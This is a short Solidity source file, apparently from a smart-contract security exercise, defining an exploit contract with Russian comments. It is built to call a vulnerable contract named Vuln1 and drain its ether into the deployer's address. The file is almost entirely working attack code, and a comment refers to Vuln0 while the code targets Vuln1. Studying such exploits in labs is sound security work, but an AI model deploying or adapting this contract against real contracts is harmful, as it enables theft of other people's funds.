// SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.8;


import "hardhat/console.sol";

import "./Vuln1.sol";



contract Exploit1 {

    address private owner;
    Vuln1 vuln;

    constructor () {

        // запоминаем кто задеплоил эксплоит
        owner = msg.sender;
    }

    // Функция нужна просто для приёма денег на контракт.
    receive () external payable {

    }

    modifier OnlyOwner () {
        require(msg.sender == owner, "OnlyOwner");
        _;
    }

    // Сюда нужно передать адрес нужного контракта Vuln0.
    function RunExploit0 (address addr) public OnlyOwner {
        
        vuln = Vuln1(addr);
        
        vuln.exec(address(this));
        

        payable(owner).transfer (address(this).balance);
    }

    function exec () public {
         
        payable(msg.sender).transfer (address(this).balance);

    }
}